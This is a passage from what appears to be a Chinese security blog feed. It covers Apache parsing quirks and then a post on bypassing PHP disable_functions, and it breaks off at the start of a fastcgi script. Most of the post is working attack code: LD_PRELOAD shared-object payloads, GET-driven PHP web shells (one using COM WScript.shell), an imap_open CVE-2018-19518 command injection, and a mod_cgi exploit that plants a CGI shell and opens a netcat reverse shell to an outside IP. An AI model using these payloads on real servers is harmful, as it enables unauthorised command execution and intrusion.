class="line">Off(当且仅当URL指向真实存在的地址时返回正确内容，如果有PATHINFO就返回404)</span><br><span class="line">A request will only be accepted if it maps to a literal path that exists. Therefore a request with trailing pathname information after the true filename such as &#x2F;test&#x2F;here.html&#x2F;more in the above example will return a 404 NOT FOUND error.</span><br><span class="line">On（类比与THinkPHP来考虑）</span><br><span class="line">A request will be accepted if a leading path component maps to a file that exists. The above example &#x2F;test&#x2F;here.html&#x2F;more will be accepted if &#x2F;test&#x2F;here.html maps to a valid file.</span><br><span class="line">Default</span><br><span class="line">The treatment of requests with trailing pathname information is determined by the handler responsible for the request. The core handler for normal files defaults to rejecting PATH_INFO requests. Handlers that serve scripts, such as cgi-script and isapi-handler, generally accept PATH_INFO by default.</span><br><span class="line"></span><br><span class="line">PathInfo模式:PATH_INFO的方式的URL也是从协议开始,然后后面跟上域名,域名后面是入口文件,入口文件后依次为模块,控制器,方法;然后是依次传入的参数</span><br></pre></td></tr></table></figure><p>AllowEncodedSlashes（作用：是否允许<code>%2F</code>for <code>/</code> and additionally <code>%5C</code> for \ ）经常和他同时使用</p></li><li><p>AddDefaultCharset </p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">设置页面的默认编码</span><br><span class="line">可以在htaccess中使用</span><br></pre></td></tr></table></figure><p> <strong>漏洞</strong>：配合上面这点，配合我们的输入内容，可以构建一个XSS攻击。</p><p> 同类型的有:<code>AddCharset</code>可以对不同后缀名的文件实现编码</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddCharset EUC-JP .euc</span><br><span class="line">AddCharset ISO-2022-JP .jis</span><br><span class="line">AddCharset SHIFT_JIS .sjis</span><br></pre></td></tr></table></figure></li></ul><h2 id="三、Module-mod-mime"><a href="#三、Module-mod-mime" class="headerlink" title="三、Module mod_mime"></a>三、Module mod_mime</h2><p>这是一个关于对于<code>content-type</code>和<code>language</code>解析的模块，这个模块在老版本的apache中经常出现解析问题，但是经过这么多年了，很多的漏洞都被修复了，但是其自带的一些天然的解析特点依然可以被我们用在绕过<code>WAF</code>的过程中，这样或许可以达到事半功倍的效果，这是我把这一部分单独拿出来的原因，废话不多说，我们进入正题。</p><h3 id="Files-with-Multiple-Extensions"><a href="#Files-with-Multiple-Extensions" class="headerlink" title="Files with Multiple Extensions"></a>Files with Multiple Extensions</h3><p>当一个文件具有多个后缀名的时候，如果两个后缀名的含义是不一样的，指向的是不同类型的处理器，这样不会留下什么隐患，比如<code>word.html.en</code>和<code>word.en.html</code>这两者都将被解析成为media-type <code>text/html</code>和 <code>Content-Language: en</code>。</p><p>但是当这样的文件名出现的时候就会出现问题<code>world.php.jpg</code>。这个文件最后会被解析成为一个php文件，原因是，apache的模块在解析的时候，是从右向左的，后面的结果会覆盖后面的结果。所以当我们在对于不同的后缀名指定解释器的时候，就应该使用<code>sethandler</code>，而不是<code>AddHandler</code></p><h3 id="Content-encoding"><a href="#Content-encoding" class="headerlink" title="Content encoding"></a>Content encoding</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-encoding: pkzip</span><br></pre></td></tr></table></figure><p>解码格式</p><h3 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a>AddType</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType image&#x2F;gif .gif</span><br><span class="line">AddType image&#x2F;jpeg jpeg jpg jpe</span><br></pre></td></tr></table></figure><h3 id="MultiviewsMatch"><a href="#MultiviewsMatch" class="headerlink" title="MultiviewsMatch"></a>MultiviewsMatch</h3><p>这个配置的两个选项，一个允许多重后缀名，一个不允许多重后缀名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MultiviewsMatch Any|NegotiatedOnly|Filters|Handlers [Handlers|Filters]</span><br></pre></td></tr></table></figure><p>当其设置为<code>handlers</code>和<code>filters</code>这样就可以匹配解释器来运行了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Apache的主要目录和配置文件理解&quot;&gt;&lt;a href=&quot;#Apache的主要目录和配置文件理解&quot; class=&quot;headerlink&quot; title=&quot;Apache的主要目录和配置文件理解&quot;&gt;&lt;/a&gt;Apache的主要目录和配置文件理解&lt;/h1&gt;&lt;p&gt;参考链接:&lt;</summary>
      
    
    
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>安卓之旅-4</title>
    <link href="http://example.com/2020/10/24/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-4/"/>
    <id>http://example.com/2020/10/24/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-4/</id>
    <published>2020-10-24T09:00:11.000Z</published>
    <updated>2020-10-24T09:01:25.907Z</updated>
    
    <content type="html"><![CDATA[<h2 id="手机刷机之旅开始了"><a href="#手机刷机之旅开始了" class="headerlink" title="手机刷机之旅开始了"></a>手机刷机之旅开始了</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;手机刷机之旅开始了&quot;&gt;&lt;a href=&quot;#手机刷机之旅开始了&quot; class=&quot;headerlink&quot; title=&quot;手机刷机之旅开始了&quot;&gt;&lt;/a&gt;手机刷机之旅开始了&lt;/h2&gt;</summary>
      
    
    
    
    
    <category term="Android" scheme="http://example.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>绕过DisFunc小技巧</title>
    <link href="http://example.com/2020/10/13/%E7%BB%95%E8%BF%87DisFunc%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>http://example.com/2020/10/13/%E7%BB%95%E8%BF%87DisFunc%E5%B0%8F%E6%8A%80%E5%B7%A7/</id>
    <published>2020-10-13T11:45:42.000Z</published>
    <updated>2020-10-25T03:33:01.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="绕过DisFunc的常见小技巧"><a href="#绕过DisFunc的常见小技巧" class="headerlink" title="绕过DisFunc的常见小技巧"></a>绕过DisFunc的常见小技巧</h1><p>解析webshell命令不能执行时的三大情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一是 php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类命令执行的相关函数；</span><br><span class="line">二是 web 进程运行在 rbash 这类受限 shell 环境中</span><br><span class="line">三是 WAF 拦劫</span><br><span class="line">区别在于，1时什么命令都无法执行，2.3时部分命令可以执行</span><br></pre></td></tr></table></figure><p>绕过disfunc的常用手法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；</span><br><span class="line">第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；</span><br><span class="line">第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；</span><br><span class="line">第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</span><br></pre></td></tr></table></figure><h2 id="一、LD-PRELOAD-amp-putenv"><a href="#一、LD-PRELOAD-amp-putenv" class="headerlink" title="一、LD_PRELOAD &amp; putenv()"></a>一、LD_PRELOAD &amp; putenv()</h2><h3 id="1-原理解析"><a href="#1-原理解析" class="headerlink" title="1.原理解析"></a>1.原理解析</h3><p>详细原理文章:<a href="https://www.anquanke.com/post/id/175403%E9%A3%98%E9%9B%B6%E5%A4%A7%E5%B8%88%E5%82%85%E7%9A%84%E6%96%87%E7%AB%A0">https://www.anquanke.com/post/id/175403飘零大师傅的文章</a></p><p>LD_PRELOAD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</span><br></pre></td></tr></table></figure><p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用</p><p>而putenv可以设置环境变量，两者搭配干活不累，注意这是<strong>暂时性的环境变量的设置，仅在会话期间起作用</strong></p><p>首先这道题的大致原理就是，像<code>mail</code>这一类的函数在调用的时候，会调研系统的动态链接库，我们通过LD_PRELOAD进行环境变量的设置，将该函数本应该调用的动态链接库改成我们制作的恶意文件，从而达到进行执行我们想执行的函数的作用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），a.bin 内部调用系统函数 b()，b() 位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，我想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的 c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，将突破 disable_functions 限制执行操作系统命令这一目标，大致分解成几步在本地推演：查看进程调用系统函数明细、操作系统环境下劫持系统函数注入代码、找寻内部启动新进程的 PHP 函数、PHP 环境下劫持系统函数注入代码。</span><br></pre></td></tr></table></figure><p>这样我们呢就可以进行我们的骚操作了</p><p><img src="https://i.loli.net/2020/10/13/lcypLN9eDZngFhk.png"></p><p>这样我们进行对已有的常见的函数进行trace来看一下</p><p><img src="https://i.loli.net/2020/10/13/kyY2Mr7jxhF4dX6.png"></p><p>对于<code>/usr/sbin/sendmail</code>可以查到很多他调用的函数，比如其中的<code>getuid</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">运行 nm -D &#x2F;usr&#x2F;bin&#x2F;id 2&gt;&amp;1 或 readelf -Ws &#x2F;usr&#x2F;bin&#x2F;id 可查看该程序可能调用的系统 API 明细：</span><br><span class="line">man 2 getuid 查看函数原型</span><br><span class="line">印象中，处理图片、请求网页、发送邮件等三类场景中可能存在我想要的函数，我得逐一验证。</span><br><span class="line">处理图片，通常调用 PHP 封装的 ImageMagick 库，新建 image.php，调用 Imagick()</span><br><span class="line">请求网页，新建 http.php，调用 curl_init()：</span><br></pre></td></tr></table></figure><p>然后写一个hack.so</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload() &#123;</span><br><span class="line">        system(&quot;ls &#x2F; &gt; &#x2F;tmp&#x2F;sky&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int geteuid() </span><br><span class="line">&#123;</span><br><span class="line">    if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure><p>然后运行脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>就可以看见</p><p><img src="https://i.loli.net/2020/10/13/DWS412EPs8fRpxG.png"></p><p>发现确实执行相关的命令，这是毫无悬念的。</p><p>这样的话利用起来是不是就没有什么难度了，同样可以使用其他相同的函数进行操作。</p><h3 id="改进版"><a href="#改进版" class="headerlink" title="改进版"></a>改进版</h3><p>GCC 有个 C 语言扩展修饰符 <strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <strong>attribute</strong>((constructor)) 修饰的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">__attribute__ ((__constructor__)) void preloadme (void)</span><br><span class="line">&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    const char* cmdline &#x3D; getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc2.so  &lt;/p&gt;&quot;</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">&quot; &gt; &quot;</span> . $out_path . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . $evil_cmdline . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    putenv(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=&quot;</span> . $so_path);</span><br><span class="line">    mail(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . nl2br(file_get_contents($out_path)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从环境变量 EVIL_CMDLINE 中接收 bypass_disablefunc.php 传递过来的待执行的命令行。</p><p>根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;ls&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>__attribute__ ((__constructor__))</code>有如下说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.It&#39;s run when a shared library is loaded, typically during program startup.</span><br><span class="line">2.That&#39;s how all GCC attributes are; presumably to distinguish them from function calls.</span><br><span class="line">3.The destructor is run when the shared library is unloaded, typically at program exit.</span><br></pre></td></tr></table></figure><p>意思就是这个函数会在evil shared library load上后，就会触发这个函数，反正就是特别早的触发。在实际利用中，注意找到那个<code>开启子进程</code>的大宝贝。</p><h3 id="2-利用"><a href="#2-利用" class="headerlink" title="2.利用"></a>2.利用</h3><p>mail函数，error函数以及关键函数未被ban，都是通过send_mail命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;alex.so&quot;);</span><br><span class="line">error_log(&quot;alex&quot;,1,&quot;&quot;,&quot;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="二、mod-cgi-模式"><a href="#二、mod-cgi-模式" class="headerlink" title="二、mod_cgi 模式"></a>二、mod_cgi 模式</h2><p>利用cgi程序可以执行命令这一点来执行系统命令,disable_functions也没办法.</p><p>临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序,则可以在目的目录下使用htaccess文件进行配置,如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCgi</span><br><span class="line">AddHandler cgi-script *.dazzle</span><br></pre></td></tr></table></figure><p>要求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apache且运行mod_cgi模式</span><br><span class="line">web目录可写</span><br><span class="line">允许.htaccess生效</span><br><span class="line">在.htaccess 中添加以下内容，指定.dazzle为结尾的文件为CGI脚本程序并且允许本目录执行，我们只要同时上传一个.dazzle的shell就可以了。</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; &quot;nc -c &#39;&#x2F;bin&#x2F;bash&#39; 172.16.15.1 4444&quot;; &#x2F;&#x2F;command to be executed</span><br><span class="line">$shellfile &#x3D; &quot;#!&#x2F;bin&#x2F;bash\n&quot;; &#x2F;&#x2F;using a shellscript</span><br><span class="line">$shellfile .&#x3D; &quot;echo -ne \&quot;Content-Type: text&#x2F;html\\n\\n\&quot;\n&quot;; &#x2F;&#x2F;header is needed, otherwise a 500 error is thrown when there is output</span><br><span class="line">$shellfile .&#x3D; &quot;$cmd&quot;; &#x2F;&#x2F;executing $cmd</span><br><span class="line">function checkEnabled($text,$condition,$yes,$no) &#x2F;&#x2F;this surely can be shorter</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$text: &quot; . ($condition ? $yes : $no) . &quot;&lt;br&gt;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_GET[&#39;checked&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    @file_put_contents(&#39;.htaccess&#39;, &quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); &#x2F;&#x2F;Append it to a .htaccess file to see whether .htaccess is allowed</span><br><span class="line">    header(&#39;Location: &#39; . $_SERVER[&#39;PHP_SELF&#39;] . &#39;?checked&#x3D;true&#39;); &#x2F;&#x2F;execute the script again to see if the htaccess test worked</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $modcgi &#x3D; in_array(&#39;mod_cgi&#39;, apache_get_modules()); &#x2F;&#x2F; mod_cgi enabled?</span><br><span class="line">    $writable &#x3D; is_writable(&#39;.&#39;); &#x2F;&#x2F;current dir writable?</span><br><span class="line">    $htaccess &#x3D; !empty($_SERVER[&#39;HTACCESS&#39;]); &#x2F;&#x2F;htaccess enabled?</span><br><span class="line">        checkEnabled(&quot;Mod-Cgi enabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);</span><br><span class="line">        checkEnabled(&quot;Is writable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);</span><br><span class="line">        checkEnabled(&quot;htaccess working&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);</span><br><span class="line">    if(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Error. All of the above must be true for the script to work!&quot;; &#x2F;&#x2F;abort if not</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        checkEnabled(&quot;Backing up .htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded! Saved in .htaccess.bak&quot;,&quot;Failed!&quot;); &#x2F;&#x2F;make a backup, cause you never know.</span><br><span class="line">        checkEnabled(&quot;Write .htaccess file&quot;,file_put_contents(&#39;.htaccess&#39;,&quot;Options +ExecCGI\nAddHandler cgi-script .dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;); &#x2F;&#x2F;.dizzle is a nice extension</span><br><span class="line">        checkEnabled(&quot;Write shell file&quot;,file_put_contents(&#39;shell.dizzle&#39;,$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;); &#x2F;&#x2F;write the file</span><br><span class="line">        checkEnabled(&quot;Chmod 777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;); &#x2F;&#x2F;rwx</span><br><span class="line">        echo &quot;Executing the script now. Check your listener &lt;img src &#x3D; &#39;shell.dizzle&#39; style &#x3D; &#39;display:none;&#39;&gt;&quot;; &#x2F;&#x2F;call the script</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="三、系统组件绕过"><a href="#三、系统组件绕过" class="headerlink" title="三、系统组件绕过"></a>三、系统组件绕过</h2><p>Window com组件(php 5.4及以下默认开启)(高版本扩展要自己添加）<br>添加方法：<br>        在php相应版本下ext查找<code>php_com_dotnet.dll</code>,一般都会有。没有的话，下载添加到ext目录下。<br>查看php.ini中是否已经开启了com.allow_dcom = true</p><p>然后在查找php.ini里面查找下extension=php_com_dotnet.dll把前面的#号或;号去掉。<br>如果没有找到，添加上extension=php_com_dotnet.dll即可。然后重启apache。然后查看phpinfo();</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; 生成一个COM对象　Shell.Application也能</span><br><span class="line">$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c &quot;.$command); &#x2F;&#x2F;调用对象方法来执行命令</span><br><span class="line">$stdout &#x3D; $exec-&gt;StdOut();</span><br><span class="line">$stroutput &#x3D; $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="四、利用IMAP-OPEN-CVE-2018-19518"><a href="#四、利用IMAP-OPEN-CVE-2018-19518" class="headerlink" title="四、利用IMAP_OPEN(CVE-2018-19518)"></a>四、利用IMAP_OPEN(CVE-2018-19518)</h2><p>Php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）</p><p>Ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。即使是ssh连接失败了，但是命令还是能执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$exp &#x3D; &quot;echo test!test! &gt; &#x2F;tmp&#x2F;test&quot;;</span><br><span class="line">$base64_exp &#x3D; base64_encode($exp);</span><br><span class="line">$server &#x3D; &quot;x -oProxyCommand&#x3D;echo\t$&#123;base64_exp&#125;|base64\t-d|sh&#125;&quot;;</span><br><span class="line">imap_open(&#39;&#123;&#39;.$server.&#39;:143&#x2F;imap&#125;INBOX&#39;, &#39;&#39;, &#39;&#39;) or die(&quot;\n\nError: &quot;.imap_last_error());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>最后附上一个fastcgi的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span 